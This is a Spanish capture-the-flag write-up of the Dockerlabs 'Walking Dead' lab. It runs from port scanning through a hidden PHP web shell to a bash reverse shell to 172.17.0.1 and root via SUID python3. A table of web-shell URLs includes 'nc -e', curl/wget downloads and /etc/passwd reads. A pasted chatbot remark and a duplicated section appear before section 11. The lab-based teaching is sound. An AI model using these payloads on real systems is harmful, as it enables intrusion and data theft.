# 🛡️ Informe de Pentesting – Máquina *Walking Dead*

**Nivel de dificultad:** Fácil  
**Fuente:** Dockerlabs  
**Ruta de evidencias:** `/Walking_Dead/Imagenes/`  
**Objetivo:** Identificar vulnerabilidades y obtener acceso privilegiado al sistema.

![Logo](/Walking_Dead/Imagenes/Logo.png)

---

## 1. 🧱 Despliegue de la Máquina

La máquina vulnerable *Walking Dead* se obtuvo desde el repositorio de Dockerlabs. Se desplegó utilizando los siguientes comandos:

```bash
unzip walking_dead.zip
sudo bash auto_deploy.sh walking_dead.tar
```

Este proceso descomprime los archivos necesarios y lanza el contenedor en un entorno local usando Docker.

![Despliegue](/Walking_Dead/Imagenes/Despliegue.jpeg)

---

## 2. 📶 Verificación de Conectividad

Se comprobó que la máquina estaba activa mediante un `ping` a su IP asignada (172.17.0.2):

```bash
ping -c4 172.17.0.2
```

La respuesta indicó que la máquina está en línea y accesible.

![Ping](/Walking_Dead/Imagenes/Ping.jpeg)

---

## 3. 🔎 Escaneo de Puertos

Se realizó un escaneo rápido y agresivo con `nmap` para identificar puertos abiertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
```

Se detectaron los siguientes puertos:

- **22 (SSH)**  
- **80 (HTTP)**

![Puertos abiertos](/Walking_Dead/Imagenes/Puertos.jpeg)

---

## 4. 🧪 Detección de Servicios

Con el script `extractPorts`, se extrajeron los puertos abiertos para realizar un escaneo más detallado:

```bash
sudo nmap -sCV -p22,80 172.17.0.2 -oN targetedScan.txt
```

Se identificaron los servicios:

- **Apache Web Server en el puerto 80**
- **OpenSSH en el puerto 22**

![Servicios detectados](/Walking_Dead/Imagenes/Servicios.jpeg)

---

## 5. 🌐 Análisis del Sitio Web

Al visitar el sitio web `http://172.17.0.2`, se presentó una página simple sin contenido relevante.

![Página principal](/Walking_Dead/Imagenes/Pagina.jpeg)

Se intentó descubrir contenido oculto usando herramientas como **Gobuster** y **Wfuzz**, pero inicialmente no se encontró nada útil.

---

## 6. 🧵 Análisis Manual del Código Fuente

Se inspeccionó manualmente el código HTML del sitio con clic derecho → “Ver código fuente”.

Se descubrió una línea oculta que hace referencia a un archivo potencialmente peligroso:

```html
<p class="hidden-link"><a href="hidden/.shell.php">Access Panel</a></p>
```

![Fragmento HTML oculto](/Walking_Dead/Imagenes/Directorio_oculto.jpeg)

Este archivo `.shell.php` sugiere la existencia de una **web shell**, una herramienta que podría permitir ejecución remota de comandos.

---

## 7. 🖥️ Confirmación y Uso de la Web Shell

Se accedió al archivo directamente en el navegador:

```
http://172.17.0.2/hidden/.shell.php
```

Inicialmente, se mostró una página en blanco, sin botones ni texto.

![Acceso a .shell.php](/Walking_Dead/Imagenes/Directorio.jpeg)

Sin embargo, al probar el siguiente parámetro en la URL:

```
http://172.17.0.2/hidden/.shell.php?cmd=whoami
```

El servidor devolvió el nombre del usuario actual: `www-data`. Esto confirmó que el archivo permite ejecutar comandos del sistema operativo a través de la URL. Estamos ante una **Web Shell funcional**.

![Salida del comando whoami](/Walking_Dead/Imagenes/web_shell.jpeg)

### ¿Qué es una Web Shell?

Una **Web Shell** es un script (como un archivo PHP) alojado en un servidor web que permite ejecutar comandos del sistema mediante el navegador. Esto se logra generalmente mediante el uso de parámetros en la URL como `?cmd=COMANDO`.

#### Ejemplos de comandos útiles que se pueden ejecutar con esta Web Shell:

| Comando | Descripción | Ejemplo de URL |
|--------|-------------|----------------|
| `whoami` | Ver usuario actual | `http://172.17.0.2/hidden/.shell.php?cmd=whoami` |
| `uname -a` | Mostrar versión del sistema operativo | `http://172.17.0.2/hidden/.shell.php?cmd=uname+-a` |
| `id` | Mostrar UID y grupos del usuario | `http://172.17.0.2/hidden/.shell.php?cmd=id` |
| `ls /home` | Ver usuarios locales | `http://172.17.0.2/hidden/.shell.php?cmd=ls+/home` |
| `find / -perm -4000 -type f 2>/dev/null` | Buscar archivos con SUID | `http://172.17.0.2/hidden/.shell.php?cmd=find+/+-perm+-4000+-type+f+2%3E%2Fdev%2Fnull` |

![Usuarios](/Walking_Dead/Imagenes/usuarios.jpeg)
![Intento](/Walking_Dead/Imagenes/Intento.jpeg)
![Pruebas](/Walking_Dead/Imagenes/Comprobar.jpeg)

---

## 8. 🔁 Acceso con Shell Reversa

Una **shell reversa** permite al atacante obtener una consola interactiva desde la máquina víctima hacia la suya.

### 1. Enviar el comando desde la Web Shell:

```bash
http://172.17.0.2/hidden/.shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/172.17.0.1/4444+0>%261'
```

Esto redirige una sesión interactiva de `bash` a la máquina atacante en el puerto 4444.

### 2. Escuchar con Netcat en la máquina atacante:

```bash
nc -lvnp 4444
```

Cuando el servidor ejecuta el comando, se conecta al Netcat que está escuchando.

```
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 45738
```

Ya se tiene acceso remoto al sistema.

---

## 9. 🔐 Escalada de Privilegios

### Problemas con la shell reversa:

```
bash: cannot set terminal process group (23): Inappropriate ioctl for device
bash: no job control in this shell
```

Estos mensajes indican que la shell no es completamente interactiva, pero aún se pueden ejecutar comandos.

### Enumeración de binarios con SUID:

```bash
find / -perm -4000 -ls 2>/dev/null
```

El bit **SUID** permite que un archivo se ejecute con los privilegios del propietario, incluso si lo ejecuta un usuario con menos permisos.

Entre los resultados se encontró:

- `/usr/bin/python3.8`
- `/usr/bin/sudo`

![Objetivo](/Walking_Dead/Imagenes/Prueba.jpeg)

### Uso de Python para obtener root:

```bash
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

Esto abre una nueva instancia de bash con privilegios preservados (gracias al SUID), y ejecutamos:

```bash
whoami
```

El resultado: `root`

¡Acceso total al sistema!

![Explotación](/Walking_Dead/Imagenes/Explotacion.jpeg)

---

## 10. 📘 Glosario Técnico

### 🧪 Fuzzing

Técnica para descubrir directorios o archivos ocultos en un servidor web, enviando muchas solicitudes con nombres comunes.

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt
```

---

### 🔐 Web Shell

Una **web shell** es un archivo en el servidor (como un `.php`) que permite ejecutar comandos del sistema usando el navegador.

Ejemplo:

```
http://172.17.0.2/hidden/.shell.php?cmd=ls
```

---

### 🔧 SUID (Set User ID)

Permiso especial que permite ejecutar un archivo con los privilegios del propietario, en vez del usuario actual. Puede ser explotado para obtener acceso de administrador.

---

### 🔙 Shell Reversa

Una técnica que permite al atacante recibir una conexión del servidor víctima, abriendo una terminal remota hacia la máquina atacante.

---
Perfecto. A continuación te dejo la **sección completa ya redactada** para que la incorpores justo antes de la conclusión del informe. Esta sección explica con claridad qué tipo de comandos se pueden ejecutar mediante una Web Shell, con ejemplos concretos, incluyendo el formato de la URL y lo que hace cada uno. Todo está explicado para que lo entienda alguien sin conocimientos técnicos previos.

---

## 11. Ejecución de Comandos Remotos con la Web Shell

Una vez identificada y confirmada la Web Shell en `http://172.17.0.2/hidden/.shell.php`, es posible **ejecutar comandos en el servidor de forma remota** utilizando la URL y el parámetro `cmd`.

La estructura general para ejecutar un comando es:

```
http://172.17.0.2/hidden/.shell.php?cmd=<comando>
```

Cuando se coloca un comando al final del parámetro `cmd`, este será procesado por el servidor como si lo hubiera escrito un usuario directamente en una terminal del sistema. Esto representa una **vulnerabilidad crítica**.

---
### Ejecución de Comandos Remotos con la Web Shell
Una vez identificada y confirmada la Web Shell en http://172.17.0.2/hidden/.shell.php, es posible ejecutar comandos en el servidor de forma remota utilizando la URL y el parámetro cmd.

La estructura general para ejecutar un comando es:

```bash
http://172.17.0.2/hidden/.shell.php?cmd=<comando>
```

Cuando se coloca un comando al final del parámetro cmd, este será procesado por el servidor como si lo hubiera escrito un usuario directamente en una terminal del sistema. Esto representa una vulnerabilidad crítica.

### 🔧 Tabla de Comandos Útiles en Web Shell
A continuación, se presentan ejemplos útiles de comandos que se pueden probar, explicando lo que hace cada uno y mostrando cómo se vería la URL lista para usarse desde el navegador.

| Comando | URL completa para ejecutar | ¿Qué hace? |
|--------|------------------------------|------------|
| `whoami` | `http://172.17.0.2/hidden/.shell.php?cmd=whoami` | Muestra el usuario con el que se están ejecutando los comandos. |
| `id` | `http://172.17.0.2/hidden/.shell.php?cmd=id` | Muestra UID, GID y grupos del usuario actual. |
| `uname -a` | `http://172.17.0.2/hidden/.shell.php?cmd=uname%20-a` | Muestra detalles del sistema operativo, kernel y arquitectura. |
| `hostname` | `http://172.17.0.2/hidden/.shell.php?cmd=hostname` | Muestra el nombre del host (nombre de la máquina). |
| `pwd` | `http://172.17.0.2/hidden/.shell.php?cmd=pwd` | Muestra el directorio actual. |
| `ls -la` | `http://172.17.0.2/hidden/.shell.php?cmd=ls%20-la` | Lista archivos, incluyendo ocultos, con detalles. |
| `cat /etc/passwd` | `http://172.17.0.2/hidden/.shell.php?cmd=cat%20/etc/passwd` | Muestra los usuarios del sistema. Útil para ver nombres de usuarios locales. |
| `ps aux` | `http://172.17.0.2/hidden/.shell.php?cmd=ps%20aux` | Muestra los procesos activos en el sistema. |
| `netstat -tunlp` | `http://172.17.0.2/hidden/.shell.php?cmd=netstat%20-tunlp` | Muestra puertos abiertos y los servicios asociados. |
| `env` | `http://172.17.0.2/hidden/.shell.php?cmd=env` | Muestra las variables de entorno actuales. |
| `ls /home` | `http://172.17.0.2/hidden/.shell.php?cmd=ls%20/home` | Muestra las carpetas de usuarios locales. |
| `find / -perm -4000 -type f 2>/dev/null` | `http://172.17.0.2/hidden/.shell.php?cmd=find%20/%20-perm%20-4000%20-type%20f%202%3E/dev/null` | Busca archivos con permisos SUID (potenciales vectores de escalada de privilegios). |
| `sudo -l` | `http://172.17.0.2/hidden/.shell.php?cmd=sudo%20-l` | Muestra qué comandos puede ejecutar el usuario con `sudo` (si no pide contraseña). |
| `crontab -l` | `http://172.17.0.2/hidden/.shell.php?cmd=crontab%20-l` | Muestra tareas programadas del usuario actual. |
| `ls /var/www/html` | `http://172.17.0.2/hidden/.shell.php?cmd=ls%20/var/www/html` | Muestra el contenido del directorio donde suelen estar alojadas las páginas web. |
| `curl http://IP:PORT` | `http://172.17.0.2/hidden/.shell.php?cmd=curl%20http://172.17.0.1:8000` | Prueba si la máquina puede hacer peticiones HTTP (útil para descargar archivos o probar conexión inversa). |
| `wget http://IP:PORT` | `http://172.17.0.2/hidden/.shell.php?cmd=wget%20http://172.17.0.1:8000` | Intenta descargar un archivo desde tu máquina atacante. |
| `python3 -c "import pty; pty.spawn('/bin/bash')"` | `http://172.17.0.2/hidden/.shell.php?cmd=python3%20-c%20%22import%20pty;%20pty.spawn('/bin/bash')%22` | Mejora la interactividad de la shell (en algunos casos). |
| `nc -e /bin/bash IP PORT` | `http://172.17.0.2/hidden/.shell.php?cmd=nc%20-e%20/bin/bash%20172.17.0.1%204444` | Intenta enviar una shell reversa si netcat tiene soporte para `-e`. |
| `bash -i >& /dev/tcp/IP/PORT 0>&1` | `http://172.17.0.2/hidden/.shell.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/172.17.0.1/4444%200%3E%261` | Shell reversa usando bash puro (ya utilizado en este caso). |

---
## ✅ Conclusión

Se identificó y explotó una vulnerabilidad **RCE** (ejecución remota de comandos) a través de una Web Shell. Se usó esta para lanzar una **shell reversa**, y posteriormente, mediante un binario SUID de Python, se logró **acceso root** completo al sistema.

Este escenario representa un caso realista de compromiso completo de un servidor mal configurado, y subraya la importancia de revisar archivos ocultos, permisos especiales y código fuente.

